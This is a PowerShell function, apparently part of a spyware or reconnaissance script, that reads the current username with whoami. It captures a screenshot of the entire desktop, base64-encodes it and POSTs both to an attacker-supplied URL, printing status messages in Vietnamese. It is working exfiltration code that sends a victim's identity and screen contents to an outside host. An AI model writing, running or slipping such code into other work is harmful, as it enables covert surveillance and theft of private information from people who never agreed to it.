function info {
  param(
    [Parameter(Mandatory = $true)]
    [String]$hq # URL to send information (be cautious about where this goes)
  )

  # Get username
  $name = whoami

  # Capture screenshot
  Add-Type -AssemblyName System.Windows.Forms
  Add-Type -AssemblyName System.Drawing

  $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
  $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
  $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
  $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
  $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

  # Save screenshot to temporary file
  $screenshotPath = "$env:TEMP\screenshot_$([System.Guid]::NewGuid()).png"
  $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

  $graphics.Dispose()
  $bitmap.Dispose()

  # Prepare data to send
  try {
    $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
    $encodedScreenshot = [Convert]::ToBase64String($fileContent)
    $body = @{
      name = $name
      screenshot = $encodedScreenshot
    } | ConvertTo-Json -Depth 10

    # Send information through POST request
    $response = Invoke-RestMethod -Uri $hq -Method POST -Body $body -ContentType "application/json"
    Write-Host "Thông tin đã được gửi thành công. Phản hồi từ server:"
    Write-Host $response
  } catch {
    Write-Host "Lỗi khi gửi thông tin: $_"
  } finally {
    # Remove temporary file
    if (Test-Path -Path $screenshotPath) {
      Remove-Item -Path $screenshotPath -Force
    }
  }
}
